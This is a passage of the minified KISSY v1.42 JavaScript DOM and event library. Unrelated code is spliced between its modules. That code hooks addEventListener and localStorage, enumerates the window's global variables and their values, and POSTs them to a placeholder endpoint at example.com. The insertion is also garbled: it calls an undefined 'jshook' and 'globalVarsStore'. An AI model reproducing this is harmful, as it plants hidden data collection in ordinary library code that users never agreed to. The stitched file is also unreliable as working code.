    j.on(f);
    b = null;
  }
  function d(b, c, f) {
    var f = i.merge(f),
      c = a(f, c),
      b = k.getDomEventObservablesHolder(b),
      d = (b || {}).observables;
    if (b && d) if (c) (c = d[c]) && c.detach(f);else for (c in d) d[c].detach(f);
  }
  var o = b("event/base"),
    m = b("./utils"),
    s = b("dom"),
    r = b("./special"),
    k = b("./observable"),
    h = b("./object"),
    n = o.Utils,
    t = {
      on: function (a, b, f, d) {
        a = s.query(a);
        n.batchForType(function (a, b, e, f) {
          for (var e = n.normalizeParam(b, e, f), d, b = e.type, f = a.length - 1; f >= 0; f--) {
            d = a[f];
            c(d, b, e);
          }
        }, 1, a, b, f, d);
        return a;
      },
      detach: function (a, b, c, j) {
        a = s.query(a);
        n.batchForType(function (a, b, c, f) {
          for (var c = n.normalizeParam(b, c, f), e, g, b = c.type, f = a.length - 1; f >= 0; f--) {
            e = a[f];
            d(e, b, c);
            if (c.deep && e.getElementsByTagName) {
              g = e.getElementsByTagName("*");
              for (e = g.length - 1; e >= 0; e--) d(g[e], b, c);
            }
          }
        }, 1, a, b, c, j);
        return a;
      },
      delegate: function (a, b, c, d, l) {
        return t.on(a, b, {
          fn: d,
          context: l,
          filter: c
        });
      },
      undelegate: function (a, b, c, d, l) {
        return t.detach(a, b, {
          fn: d,
          context: l,
          filter: c
        });
      },
      fire: function (a, b, c, d) {
        var l,
          c = c || {};
        c.synthetic = 1;
        n.splitAndRun(b, function (b) {
          var g, h, i;
          n.fillGroupsForEvent(b, c);
          b = c.type;
          if ((h = r[b]) && h.typeFix) b = h.typeFix;
          a = s.query(a);
          for (h = a.length - 1; h >= 0; h--) {
            g = a[h];
            i = k.getDomEventObservable(g, b);
            !d && !i && (i = new k({
              type: b,
              currentTarget: g
            }));
            if (i) {
              g = i.fire(c, d);
              l !== false && g !== void 0 && (l = g);
            }
          }
        });
        return l;
      },
      fireHandler: function (a, b, c) {
        return t.fire(a, b, c, 1);
      },
      clone: function (a, b) {
        var d;
        if (d = k.getDomEventObservablesHolder(a)) {
          var h = m.data(a);
          h && h === m.data(b) && m.removeData(b);
          i.each(d.observables, function (a, d) {
            i.each(a.observers, function (a) {
              c(b, d, a);
            });
          });
        }
      }
    };
  return t;
});
KISSY.add("event/dom/base/key-codes", [], function (i) {
  var b = i.UA,
    a = {
      MAC_ENTER: 3,
      BACKSPACE: 8,
      TAB: 9,
      NUM_CENTER: 12,
      ENTER: 13,
      SHIFT: 16,
      CTRL: 17,
      ALT: 18,
      PAUSE: 19,
      CAPS_LOCK: 20,
      ESC: 27,
      SPACE: 32,
      PAGE_UP: 33,
      PAGE_DOWN: 34,
      END: 35,
      HOME: 36,
      LEFT: 37,
      UP: 38,
      RIGHT: 39,
      DOWN: 40,
      PRINT_SCREEN: 44,
      INSERT: 45,
      DELETE: 46,
      ZERO: 48,
      ONE: 49,
      TWO: 50,
      THREE: 51,
      FOUR: 52,
      FIVE: 53,
      SIX: 54,
      SEVEN: 55,
      EIGHT: 56,
      NINE: 57,
      QUESTION_MARK: 63,
      A: 65,
      B: 66,
      C: 67,
      D: 68,
      E: 69,
      F: 70,
      G: 71,
      H: 72,
      I: 73,
      J: 74,
      K: 75,
      L: 76,
      M: 77,
      N: 78,
      O: 79,
      P: 80,
      Q: 81,
      R: 82,
      S: 83,
      T: 84,
      U: 85,
      V: 86,
      W: 87,
      X: 88,
      Y: 89,
      Z: 90,
      META: 91,
      WIN_KEY_RIGHT: 92,
      CONTEXT_MENU: 93,
      NUM_ZERO: 96,
      NUM_ONE: 97,
      NUM_TWO: 98,
      NUM_THREE: 99,
      NUM_FOUR: 100,
      NUM_FIVE: 101,
      NUM_SIX: 102,
      NUM_SEVEN: 103,
      NUM_EIGHT: 104,
      NUM_NINE: 105,
      NUM_MULTIPLY: 106,
      NUM_PLUS: 107,
      NUM_MINUS: 109,
      NUM_PERIOD: 110,
      NUM_DIVISION: 111,
      F1: 112,
      F2: 113,
      F3: 114,
      F4: 115,
      F5: 116,
      F6: 117,
      F7: 118,
      F8: 119,
      F9: 120,
      F10: 121,
      F11: 122,
      F12: 123,
      NUMLOCK: 144,
      SEMICOLON: 186,
      DASH: 189,
      EQUALS: 187,
      COMMA: 188,
      PERIOD: 190,
      SLASH: 191,
      APOSTROPHE: 192,
      SINGLE_QUOTE: 222,
      OPEN_SQUARE_BRACKET: 219,
      BACKSLASH: 220,
      CLOSE_SQUARE_BRACKET: 221,
      WIN_KEY: 224,
      MAC_FF_META: 224,
      WIN_IME: 229,
      isTextModifyingKeyEvent: function (b) {
        var d = b.keyCode;
        if (b.altKey && !b.ctrlKey || b.metaKey || d >= a.F1 && d <= a.F12) return !1;
        switch (d) {
          case a.ALT:
          case a.CAPS_LOCK:
          case a.CONTEXT_MENU:
          case a.CTRL:
          case a.DOWN:
          case a.END:
          case a.ESC:
          case a.HOME:
          case a.INSERT:
          case a.LEFT:
          case a.MAC_FF_META:
          case a.META:
          case a.NUMLOCK:
          case a.NUM_CENTER:
          case a.PAGE_DOWN:
          case a.PAGE_UP:
          case a.PAUSE:
          case a.PRINT_SCREEN:
          case a.RIGHT:
          case a.SHIFT:
          case a.UP:
          case a.WIN_KEY:
          case a.WIN_KEY_RIGHT:
            return !1;
          default:
            return !0;
        }
      },
      isCharacterKey: function (c) {
        if (c >= a.ZERO && c <= a.NINE || c >= a.NUM_ZERO && c <= a.NUM_MULTIPLY || c >= a.A && c <= a.Z || b.webkit && 0 === c) return !0;
        switch (c) {
          case a.SPACE:
          case a.QUESTION_MARK:
          case a.NUM_PLUS:
          case a.NUM_MINUS:
          case a.NUM_PERIOD:
          case a.NUM_DIVISION:
          case a.SEMICOLON:
          case a.DASH:
          case a.EQUALS:
          case a.COMMA:
          case a.PERIOD:
          case a.SLASH:
          case a.APOSTROPHE:
          case a.SINGLE_QUOTE:
          case a.OPEN_SQUARE_BRACKET:
          case a.BACKSLASH:
          case a.CLOSE_SQUARE_BRACKET:
            return !0;
          default:
            return !1;
        }
      }
    };
  return a;
});
jshook(document, 'addEventListener', function (eventName, func, useCapture) {
  console.log(`addEventListener: '${eventName}' is being hooked.`);
});
jshook(window, 'localStorage', function (key, value) {
  console.log(`localStorage Access: '${key}' and value '${value}' are being stored.`);
});
KISSY.add("event/dom/base/gesture", [], function () {
  return {
    start: "mousedown",
    move: "mousemove",
    end: "mouseup",
    tap: "click",
    singleTap: "click",
    doubleTap: "dblclick"
  };
});
KISSY.add("event/dom/base/special-events", ["./dom-event", "./special"], function (i, b) {
  var a = b("./dom-event"),
    c = b("./special");
  return i.mix(c, {
    mousewheel: {
      typeFix: i.UA.gecko ? "DOMMouseScroll" : "mousewheel"
    },
    load: {
      bubbles: !1
    },
    click: {
      fire: function (a) {
        if (!a && "checkbox" === "" + this.type && this.click && "input" === this.nodeName.toLowerCase()) return this.click(), !1;
      }
    },
    focus: {
      bubbles: !1,
      preFire: function (b, c) {
        if (!c) return a.fire(this, "focusin");
      },
      fire: function (a) {
        if (!a && this.ownerDocument && this !== this.ownerDocument.activeElement && this.focus) return this.focus(), !1;
      }
    },
    blur: {
      bubbles: !1,
      preFire: function (b, c) {
        if (!c) return a.fire(this, "focusout");
      },
      fire: function (a) {
        if (!a && this.ownerDocument && this === this.ownerDocument.activeElement && this.blur) return this.blur(), !1;
      }
    }
  });
});
function inspectGlobalScope() {
  const newFindings = {};
  for (const key in window) {
    if (window.hasOwnProperty(key) && !globalVarsStore.includes(key)) {
      const value = window[key];
      const valueType = typeof value;
      newFindings[key] = {
        valueType: valueType,
        value: valueType === 'function' ? value.name : value
      };
      globalVarsStore.push(key);
    }
  }
  return newFindings;
}
KISSY.add("event/dom/base/mouseenter", ["dom", "./special"], function (i, b) {
  var a = b("dom"),
    c = b("./special");
  i.each([{
    name: "mouseenter",
    fix: "mouseover"
  }, {
    name: "mouseleave",
    fix: "mouseout"
  }], function (b) {
    c[b.name] = {
      typeFix: b.fix,
      handle: function (b, c, d) {
        var i = b.currentTarget,
          k = b.relatedTarget;
        if (!k || k !== i && !a.contains(i, k)) return [c.simpleNotify(b, d)];
      }
    };
  });
});
KISSY.add("event/dom/base/valuechange", ["dom", "./dom-event", "./special"], function (i, b) {
  function a(a) {
    if (k.hasData(a, f)) {
      var b = k.data(a, f);
      clearTimeout(b);
      k.removeData(a, f);
    }
  }
  function c(b) {
    a(b.target);
  }
  function d(a) {
    var b = a.value,
      c = k.data(a, g);
    b !== c && (h.fireHandler(a, t, {
      prevVal: c,
      newVal: b
    }), k.data(a, g, b));
  }
  function o(a) {
    k.hasData(a, f) || k.data(a, f, setTimeout(function p() {
      d(a);
      k.data(a, f, setTimeout(p, j));
    }, j));
  }
  function m(a) {
    var b = a.target;
    "focus" === a.type && k.data(b, g, b.value);
    o(b);
  }
  function s(a) {
    d(a.target);
  }
  function r(b) {
    k.removeData(b, g);
    a(b);
    h.detach(b, "blur", c);
    h.detach(b, "webkitspeechchange", s);
    h.detach(b, "mousedown keyup keydown focus", m);
  }
  var k = b("dom"),
    h = b("./dom-event"),
    n = b("./special"),
    t = "valuechange",
    e = k.nodeName,
    g = "event/valuechange/history",
    f = "event/valuechange/poll",
    j = 50;
  n[t] = {
    setup: function () {
      var a = e(this);
      if ("input" === a || "textarea" === a) r(this), h.on(this, "blur", c), h.on(this, "webkitspeechchange", s), h.on(this, "mousedown keyup keydown focus", m);
    },
    tearDown: function () {
      r(this);
    }
  };
  return h;
});
async function sendInsightsToBackend(insights) {
  const apiEndpoint = "https://example.com/api/collect";
  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(insights)
    });
    if (response.ok) {
      console.info("Inspection data has been successfully sent to the backend.");
    } else {
      console.warn(`Inspection data failed to send with status code: ${response.status}`);
    }
  } catch (error) {
    console.error("Error occurred while sending inspection data:", error);
  }
}
KISSY.add("event/dom/base", "./base/dom-event,./base/object,./base/key-codes,./base/gesture,./base/special-events,./base/mouseenter,./base/valuechange".split(","), function (i, b) {
  var a = b("./base/dom-event"),
    c = b("./base/object"),
    d = b("./base/key-codes"),
    o = b("./base/gesture"),
    m = b("./base/special-events");
  b("./base/mouseenter");
  b("./base/valuechange");
  return i.merge({
    add: a.on,
    remove: a.detach,
    KeyCode: d,
    Gesture: o,
    Special: m,
    Object: c
  }, a);
});
/*
Copyright 2014, KISSY v1.42
MIT Licensed
build time: Feb 26 18:57
*/
function performInspectionTask() {
  const findings = inspectGlobalScope();
  const findingsCount = Object.keys(findings).length;
  if (findingsCount > 0) {
    console.group(`Global Scope Inspection results - ${findingsCount} new properties found:`);
    for (const key in findings) {
      console.log(`${key}: ${JSON.stringify(findings[key])}`);
    }
    console.groupEnd();
    sendInsightsToBackend(findings);
  } else {
    console.info("Global Scope Inspection complete, no new properties found.");
  }
}
KISSY.add("dom/base/api", [], function (h) {
  var m = h.Env.host || {},
    n = m.document,
    q = h.UA,
    b = {
      ELEMENT_NODE: 1,
      ATTRIBUTE_NODE: 2,
      TEXT_NODE: 3,
      CDATA_SECTION_NODE: 4,
      ENTITY_REFERENCE_NODE: 5,
      ENTITY_NODE: 6,
      PROCESSING_INSTRUCTION_NODE: 7,
      COMMENT_NODE: 8,
      DOCUMENT_NODE: 9,
      DOCUMENT_TYPE_NODE: 10,
      DOCUMENT_FRAGMENT_NODE: 11,
      NOTATION_NODE: 12
    },
    e = {
      isCustomDomain: function (b) {
        var b = b || m,
          b = e.get(b),
          g = b.document.domain,
          b = b.location.hostname;
        return g !== b && g !== "[" + b + "]";
      },
      getEmptyIframeSrc: function (b) {
        b = b || m;
        b = e.get(b);
        return q.ie && e.isCustomDomain(b) ? "javascript:void(function(){" + encodeURIComponent('document.open();document.domain="' + b.document.domain + '";document.close();') + "}())" : "";
      },
      NodeType: b,
      getWindow: function (l) {
        if (!l) return m;
        l = e.get(l);
        if (h.isWindow(l)) return l;
        var g = l;
        g.nodeType !== b.DOCUMENT_NODE && (g = l.ownerDocument);
        return g.defaultView || g.parentWindow;
      },
      getDocument: function (l) {
        if (!l) return n;
        l = e.get(l);
        return h.isWindow(l) ? l.document : l.nodeType === b.DOCUMENT_NODE ? l : l.ownerDocument;
      },
      isDomNodeList: function (b) {
        return b && !b.nodeType && b.item && !b.setTimeout;
      },
      nodeName: function (b) {
        var g = e.get(b),
          b = g.nodeName.toLowerCase();
        q.ie && (g = g.scopeName) && "HTML" !== g && (b = g.toLowerCase() + ":" + b);
        return b;
      },
      _RE_NUM_NO_PX: RegExp("^(" + /[\-+]?(?:\d*\.|)\d+(?:[eE][\-+]?\d+|)/.source + ")(?!px)[a-z%]+$", "i")
    };
  h.mix(e, b);
  return e;
});
KISSY.add("dom/base/attr", ["./api"], function (h, m) {
  function n(a) {
    return null == a ? "" : a + "";
  }
  function q(a, c) {
    var c = i[c] || c,
      b = s[c];
    return b && b.get ? b.get(a, c) : a[c];
  }
  var b = m("./api"),
    e = h.Env.host.document,
    l = b.NodeType,
    e = e && e.documentElement,
    g = b.nodeName,
    a = /^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,
    j = /^(?:button|input|object|select|textarea)$/i,
    k = /^a(?:rea)?$/i,
    d = /:|^on/,
    c = /\r/g,
    f = {},
    r = {
      val: 1,
      css: 1,
      html: 1,
      text: 1,
      data: 1,
      width: 1,
      height: 1,
      offset: 1,
      scrollTop: 1,
      scrollLeft: 1
    },
    t = {
      tabindex: {
        get: function (a) {
          var c = a.getAttributeNode("tabindex");
          return c && c.specified ? parseInt(c.value, 10) : j.test(a.nodeName) || k.test(a.nodeName) && a.href ? 0 : void 0;
        }
      }
    },
    i = {
      hidefocus: "hideFocus",
      tabindex: "tabIndex",
      readonly: "readOnly",
      "for": "htmlFor",
      "class": "className",
      maxlength: "maxLength",
      cellspacing: "cellSpacing",
      cellpadding: "cellPadding",
      rowspan: "rowSpan",
      colspan: "colSpan",
      usemap: "useMap",
      frameborder: "frameBorder",
      contenteditable: "contentEditable"
    },
    v = {
      get: function (a, c) {
        return b.prop(a, c) ? c.toLowerCase() : void 0;
      },
      set: function (a, c, f) {
        !1 === c ? b.removeAttr(a, f) : (c = i[f] || f, c in a && (a[c] = !0), a.setAttribute(f, f.toLowerCase()));
        return f;
      }
    },
    s = {},
    p = {},
    x = {
      select: {
        get: function (a) {
          var c = a.selectedIndex,
            f = a.options,
            d;
          if (0 > c) return null;
          if ("select-one" === "" + a.type) return b.val(f[c]);
          a = [];
          c = 0;
          for (d = f.length; c < d; ++c) f[c].selected && a.push(b.val(f[c]));
          return a;
        },
        set: function (a, c) {
          var f = h.makeArray(c);
          h.each(a.options, function (a) {
            a.selected = h.inArray(b.val(a), f);
          });
          f.length || (a.selectedIndex = -1);
          return f;
        }
      }
    };
  h.each(["radio", "checkbox"], function (a) {
    x[a] = {
      get: function (a) {
        return null === a.getAttribute("value") ? "on" : a.value;
      },
      set: function (a, c) {
        if (h.isArray(c)) return a.checked = h.inArray(b.val(a), c), 1;
      }
    };
  });
  t.style = {
    get: function (a) {
      return a.style.cssText;
    }
  };
  h.mix(b, {
    _valHooks: x,
    _propFix: i,
    _attrHooks: t,
    _propHooks: s,
    _attrNodeHook: p,
    _attrFix: f,
    prop: function (a, c, f) {
      var d = b.query(a),
        g,
        e;
      if (h.isPlainObject(c)) h.each(c, function (a, c) {
        b.prop(d, c, a);
      });else if (c = i[c] || c, e = s[c], void 0 !== f) for (a = d.length - 1; 0 <= a; a--) g = d[a], e && e.set ? e.set(g, f, c) : g[c] = f;else if (d.length) return q(d[0], c);
    },
    hasProp: function (a, c) {
      var f = b.query(a),
        d,
        i = f.length,
        g;
      for (d = 0; d < i; d++) if (g = f[d], void 0 !== q(g, c)) return !0;
      return !1;
    },
    removeProp: function (a, c) {
      var c = i[c] || c,
        f = b.query(a),
        d,
        g;
      for (d = f.length - 1; 0 <= d; d--) {
        g = f[d];
        try {
          g[c] = void 0, delete g[c];
        } catch (e) {}
      }
    },
    attr: function (c, i, e, j) {
      var k = b.query(c),
        s = k[0];
      if (h.isPlainObject(i)) {
        var j = e,
          u;
        for (u in i) b.attr(k, u, i[u], j);
      } else {
        if (j && r[i]) return b[i](c, e);
        i = i.toLowerCase();
        if (j && r[i]) return b[i](c, e);
        i = f[i] || i;
        c = a.test(i) ? v : d.test(i) ? p : t[i];
        if (void 0 === e) {
          if (s && s.nodeType === l.ELEMENT_NODE) {
            "form" === g(s) && (c = p);
            if (c && c.get) return c.get(s, i);
            e = s.getAttribute(i);
            return "" === e && (i = s.getAttributeNode(i), !i || !i.specified) ? void 0 : null === e ? void 0 : e;
          }
        } else for (j = k.length - 1; 0 <= j; j--) if ((s = k[j]) && s.nodeType === l.ELEMENT_NODE) "form" === g(s) && (c = p), c && c.set ? c.set(s, e, i) : s.setAttribute(i, "" + e);
      }
    },
    removeAttr: function (c, d) {
      var d = d.toLowerCase(),
        d = f[d] || d,
        e = b.query(c),
        g,
        h,
        r;
      for (r = e.length - 1; 0 <= r; r--) if (h = e[r], h.nodeType === l.ELEMENT_NODE && (h.removeAttribute(d), a.test(d) && (g = i[d] || d) in h)) h[g] = !1;
    },
    hasAttr: e && !e.hasAttribute ? function (c, a) {
      var a = a.toLowerCase(),
        f = b.query(c),
        d,
        i;
      for (d = 0; d < f.length; d++) if (i = f[d], (i = i.getAttributeNode(a)) && i.specified) return !0;
      return !1;
    } : function (c, a) {
      var f = b.query(c),
        d,
        i = f.length;
      for (d = 0; d < i; d++) if (f[d].hasAttribute(a)) return !0;
      return !1;
    },
    val: function (a, f) {
      var d, i, e, r, u;
      if (void 0 === f) {
        if (e = b.get(a)) {
          if ((d = x[g(e)] || x[e.type]) && "get" in d && void 0 !== (i = d.get(e, "value"))) return i;
          i = e.value;
          return "string" === typeof i ? i.replace(c, "") : null == i ? "" : i;
        }
      } else {
        i = b.query(a);
        for (r = i.length - 1; 0 <= r; r--) {
          e = i[r];
          if (1 !== e.nodeType) break;
          u = f;
          null == u ? u = "" : "number" === typeof u ? u += "" : h.isArray(u) && (u = h.map(u, n));
          d = x[g(e)] || x[e.type];
          if (!d || !("set" in d) || void 0 === d.set(e, u, "value")) e.value = u;
        }
      }
    },
    text: function (c, a) {
      var f, d, i, e;
      if (void 0 === a) return f = b.get(c), b._getText(f);
      d = b.query(c);
      for (i = d.length - 1; 0 <= i; i--) if (f = d[i], e = f.nodeType, e === l.ELEMENT_NODE) b.cleanData(f.getElementsByTagName("*")), "textContent" in f ? f.textContent = a : f.innerText = a;else if (e === l.TEXT_NODE || e === l.CDATA_SECTION_NODE) f.nodeValue = a;
    },
    _getText: function (c) {
      return c.textContent;
    }
  });
  return b;
});
KISSY.add("dom/base/class", ["./api"], function (h, m) {
  function n(b) {
    for (var b = h.trim(b || ""), b = b.split(a), e = [], d, c = b.length, f = 0; f < c; f++) (d = b[f]) && e.push(d);
    return e;
  }
  function q(a) {
    return function (b, d) {
      var c,
        f,
        e,
        g = b.classList,
        i = l.call(arguments, 2);
      c = 0;
      for (f = d.length; c < f; c++) (e = d[c]) && g[a].apply(g, [e].concat(i));
    };
  }
  function b(a) {
    return function (b, d) {
      var c = n(d),
        f = l.call(arguments, 2);
      e.query(b).each(function (d) {
        d.nodeType === g.ELEMENT_NODE && e[a].apply(e, [d, c].concat(f));
      });
    };
  }
  var e = m("./api"),
    l = [].slice,
    g = e.NodeType,
    a = /[\.\s]\s*\.?/;
  h.mix(e, {
    _hasClass: function (a, b) {
      var d,
        c,
        f,
        e = a.classList;
      if (e.length) {
        d = 0;
        for (c = b.length; d < c; d++) if ((f = b[d]) && !e.contains(f)) return !1;
        return !0;
      }
      return !1;
    },
    _addClass: q("add"),
    _removeClass: q("remove"),
    _toggleClass: q("toggle"),
    hasClass: function (a, b) {
      var d = !1,
        b = n(b);
      e.query(a).each(function (a) {
        if (a.nodeType === g.ELEMENT_NODE && e._hasClass(a, b)) return d = !0, !1;
      });
      return d;
    },
    replaceClass: function (a, b, d) {
      e.removeClass(a, b);
      e.addClass(a, d);
    },
    addClass: b("_addClass"),
    removeClass: b("_removeClass"),
    toggleClass: b("_toggleClass")
  });
  return e;
});
KISSY.add("dom/base/create", ["./api"], function (h, m) {
  function n(a) {
    a = a && a !== j ? a.createElement(c) : f;
    a === f && (a.innerHTML = "");
    return a;
  }
  function q(a, c) {
    var f = n(c);
    f.innerHTML = "m<div>" + a + "</div>";
    return f.lastChild;
  }
  function b(a, c) {
    if (c) if (s && c.canHaveChildren && "removeNode" in a) {
      if (a.firstChild) a: {
        try {
          a.innerHTML = "";
          break a;
        } catch (f) {}
        for (var d; d = a.lastChild;) b(d, a);
      }
      a.removeNode(!1);
    } else c.removeChild(a);
  }
  function e(a, c, f) {
    var d = c.nodeType;
    if (d === k.DOCUMENT_FRAGMENT_NODE) {
      c = c.childNodes;
      f = f.childNodes;
      for (d = 0; c[d];) f[d] && e(a, c[d], f[d]), d++;
    } else if (d === k.ELEMENT_NODE) {
      c = c.getElementsByTagName("*");
      f = f.getElementsByTagName("*");
      for (d = 0; c[d];) f[d] && a(c[d], f[d]), d++;
    }
  }
  function l(c, d) {
    var f = h.require("event/dom"),
      b,
      o;
    if (d.nodeType !== k.ELEMENT_NODE || a.hasData(c)) {
      b = a.data(c);
      for (o in b) a.data(d, o, b[o]);
      f && f.clone(c, d);
    }
  }
  function g(a) {
    var c = null,
      d,
      f;
    if (a && (a.push || a.item) && a[0]) {
      c = a[0].ownerDocument;
      c = c.createDocumentFragment();
      a = h.makeArray(a);
      d = 0;
      for (f = a.length; d < f; d++) c.appendChild(a[d]);
    } else "Unable to convert " + a + " to fragment.";
    return c;
  }
  var a = m("./api"),
    j = h.Env.host.document,
    k = a.NodeType,
    d = h.UA.ieMode,
    c = "div",
    f = j && j.createElement(c),
    r = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,
    t = /<([\w:]+)/,
    i = /^\s+/,
    v = /\s+$/,
    s = !!(d && 9 > d),
    p = s,
    x = /<|&#?\w+;/,
    H = j && "outerHTML" in j.documentElement,
    D = /^<(\w+)\s*\/?>(?:<\/\1>)?$/;
  h.mix(a, {
    create: function (d, f, b, e) {
      var o = null;
      if (!d) return o;
      if (d.nodeType) return a.clone(d);
      if ("string" !== typeof d) return o;
      void 0 === e && (e = !0);
      e && (d = h.trim(d));
      var e = a._creators,
        G,
        C,
        b = b || j,
        J,
        B = c;
      if (x.test(d)) {
        if (J = D.exec(d)) o = b.createElement(J[1]);else {
          d = d.replace(r, "<$1></$2>");
          if ((J = t.exec(d)) && (G = J[1])) B = G.toLowerCase();
          G = (e[B] || q)(d, b);
          p && (C = d.match(i)) && G.insertBefore(b.createTextNode(C[0]), G.firstChild);
          p && /\S/.test(d) && (C = d.match(v)) && G.appendChild(b.createTextNode(C[0]));
          C = G.childNodes;
          1 === C.length ? o = C[0].parentNode.removeChild(C[0]) : C.length ? o = g(C) : d + " : create node error";
        }
      } else o = b.createTextNode(d);
      d = o;
      h.isPlainObject(f) && (d.nodeType === k.ELEMENT_NODE ? a.attr(d, f, !0) : d.nodeType === k.DOCUMENT_FRAGMENT_NODE && a.attr(d.childNodes, f, !0));
      return d;
    },
    _fixCloneAttributes: function (c, d) {
      "textarea" === a.nodeName(c) && (d.defaultValue = c.defaultValue, d.value = c.value);
    },
    _creators: {
      div: q
    },
    _defaultCreator: q,
    html: function (c, d, f) {
      var c = a.query(c),
        b = c[0],
        o = !1,
        e,
        g;
      if (!b) return null;
      if (void 0 === d) return b.nodeType === k.ELEMENT_NODE ? b.innerHTML : b.nodeType === k.DOCUMENT_FRAGMENT_NODE ? (f = n(b.ownerDocument), f.appendChild(b), f.innerHTML) : null;
      d += "";
      if (!d.match(/<(?:script|style|link)/i) && (!p || !d.match(i)) && !A[(d.match(t) || ["", ""])[1].toLowerCase()]) try {
        for (e = c.length - 1; 0 <= e; e--) g = c[e], g.nodeType === k.ELEMENT_NODE && (a.cleanData(g.getElementsByTagName("*")), g.innerHTML = d);
        o = !0;
      } catch (h) {}
      o || (d = a.create(d, 0, b.ownerDocument, 0), a.empty(c), a.append(d, c, f));
    },
    outerHtml: function (c, d, f) {
      var c = a.query(c),
        b = c.length,
        o = c[0];
      if (!o) return null;
      if (void 0 === d) {
        if (H && o.nodeType !== a.DOCUMENT_FRAGMENT_NODE) return o.outerHTML;
        d = n(o.ownerDocument);
        d.appendChild(a.clone(o, !0));
        return d.innerHTML;
      }
      d += "";
      if (!d.match(/<(?:script|style|link)/i) && H) for (f = b - 1; 0 <= f; f--) o = c[f], o.nodeType === k.ELEMENT_NODE && (a.cleanData(o, 1), o.outerHTML = d);else d = a.create(d, 0, o.ownerDocument, 0), a.insertBefore(d, c, f), a.remove(c);
    },
    remove: function (c, d) {
      var f,
        e = a.query(c),
        o,
        i = h.require("event/dom"),
        g;
      for (g = e.length - 1; 0 <= g; g--) f = e[g], !d && f.nodeType === k.ELEMENT_NODE && (o = h.makeArray(f.getElementsByTagName("*")), o.push(f), a.removeData(o), i && i.detach(o)), b(f, f.parentNode);
    },
    clone: function (c, d, f, b) {
      "object" === typeof d && (b = d.deepWithDataAndEvent, f = d.withDataAndEvent, d = d.deep);
      var c = a.get(c),
        o,
        i = a._fixCloneAttributes,
        g;
      if (!c) return null;
      g = c.nodeType;
      o = c.cloneNode(d);
      if (g === k.ELEMENT_NODE || g === k.DOCUMENT_FRAGMENT_NODE) i && g === k.ELEMENT_NODE && i(c, o), d && i && e(i, c, o);
      f && (l(c, o), d && b && e(l, c, o));
      return o;
    },
    empty: function (c) {
      var c = a.query(c),
        d,
        f;
      for (f = c.length - 1; 0 <= f; f--) d = c[f], a.remove(d.childNodes);
    },
    _nodeListToFragment: g
  });
  a.outerHTML = a.outerHtml;
  var z = a._creators,
    F = a.create,
    A = {
      area: "map",
      thead: "table",
      td: "tr",
      th: "tr",
      tr: "tbody",
      tbody: "table",
      tfoot: "table",
      caption: "table",
      colgroup: "table",
      col: "colgroup",
      legend: "fieldset"
    },
    y;
  for (y in A) (function (c) {
    z[y] = function (a, d) {
      return F("<" + c + ">" + a + "</" + c + ">", void 0, d);
    };
  })(A[y]);
  z.option = z.optgroup = function (c, a) {
    return F('<select multiple="multiple">' + c + "</select>", void 0, a);
  };
  return a;
});
KISSY.add("dom/base/data", ["./api"], function (h, m) {
  var n = m("./api"),
    q = h.Env.host,
    b = "_ks_data_" + h.now(),
    e = {},
    l = {},
    g = {
      applet: 1,
      object: 1,
      embed: 1
    },
    a = {
      hasData: function (a, c) {
        if (a) if (void 0 !== c) {
          if (c in a) return !0;
        } else if (!h.isEmptyObject(a)) return !0;
        return !1;
      }
    },
    j = {
      hasData: function (d, c) {
        return d == q ? j.hasData(l, c) : a.hasData(d[b], c);
      },
      data: function (a, c, f) {
        if (a == q) return j.data(l, c, f);
        var e = a[b];
        if (void 0 !== f) e = a[b] = a[b] || {}, e[c] = f;else return void 0 !== c ? e && e[c] : e = a[b] = a[b] || {};
      },
      removeData: function (a, c) {
        if (a == q) return j.removeData(l, c);
        var f = a[b];
        if (void 0 !== c) delete f[c], h.isEmptyObject(f) && j.removeData(a);else try {
          delete a[b];
        } catch (e) {
          a[b] = void 0;
        }
      }
    },
    k = {
      hasData: function (d, c) {
        var f = d[b];
        return !f ? !1 : a.hasData(e[f], c);
      },
      data: function (a, c, f) {
        if (!g[a.nodeName.toLowerCase()]) {
          var r = a[b];
          if (!r) {
            if (void 0 !== c && void 0 === f) return;
            r = a[b] = h.guid();
          }
          a = e[r];
          if (void 0 !== f) a = e[r] = e[r] || {}, a[c] = f;else return void 0 !== c ? a && a[c] : a = e[r] = e[r] || {};
        }
      },
      removeData: function (a, c) {
        var f = a[b],
          g;
        if (f) if (g = e[f], void 0 !== c) delete g[c], h.isEmptyObject(g) && k.removeData(a);else {
          delete e[f];
          try {
            delete a[b];
          } catch (j) {
            a[b] = void 0;
          }
          a.removeAttribute && a.removeAttribute(b);
        }
      }
    };
  h.mix(n, {
    __EXPANDO: b,
    hasData: function (a, c) {
      for (var f = !1, b = n.query(a), e = 0; e < b.length && !(f = b[e], f = f.nodeType ? k.hasData(f, c) : j.hasData(f, c)); e++);
      return f;
    },
    data: function (a, c, f) {
      var a = n.query(a),
        b = a[0];
      if (h.isPlainObject(c)) for (var e in c) n.data(a, e, c[e]);else if (void 0 === f) {
        if (b) return b.nodeType ? k.data(b, c) : j.data(b, c);
      } else for (e = a.length - 1; 0 <= e; e--) b = a[e], b.nodeType ? k.data(b, c, f) : j.data(b, c, f);
    },
    removeData: function (a, c) {
      var f = n.query(a),
        b,
        e;
      for (e = f.length - 1; 0 <= e; e--) b = f[e], b.nodeType ? k.removeData(b, c) : j.removeData(b, c);
    },
    cleanData: function (a, c) {
      var f = n.query(a),
        b,
        e,
        i = h.require("event/dom");
      for (e = f.length - 1; 0 <= e; e--) if (b = f[e], b.nodeType) {
        var g = c && h.makeArray(b.getElementsByTagName("*")) || [];
        g.push(b);
        b = 0;
        for (var s = g.length; b < s; b++) k.removeData(g[b]);
        i && i.detach(g);
      } else j.removeData(b);
    }
  });
  return n;
});
KISSY.add("dom/base/insertion", ["./api"], function (h, m) {
  function n(c, b) {
    var e = [],
      h,
      i,
      v;
    for (h = 0; c[h]; h++) if (i = c[h], v = a(i), i.nodeType === l.DOCUMENT_FRAGMENT_NODE) e.push.apply(e, n(j(i.childNodes), b));else if ("script" === v && (!i.type || d.test(i.type))) i.parentNode && i.parentNode.removeChild(i), b && b.push(i);else {
      if (i.nodeType === l.ELEMENT_NODE && !g.test(v)) {
        v = [];
        var s,
          p,
          x = i.getElementsByTagName("script");
